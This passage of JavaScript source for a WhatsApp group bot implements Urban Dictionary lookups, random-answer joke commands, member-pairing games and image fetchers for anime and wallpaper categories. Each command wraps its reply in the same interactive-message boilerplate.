if (!q) return newReply(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return newReply(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return newReply(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return newReply(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return newReply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                newReply(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const Lorenzokak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: Lorenzokak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg') }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return LorenzoStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/soulmate.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return LorenzoStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/couple.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
                        case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return newReply('Enter Query Title')
                await hana()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return newReply('Enter Query Title')
                await hana()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
            }
            case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await hana()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
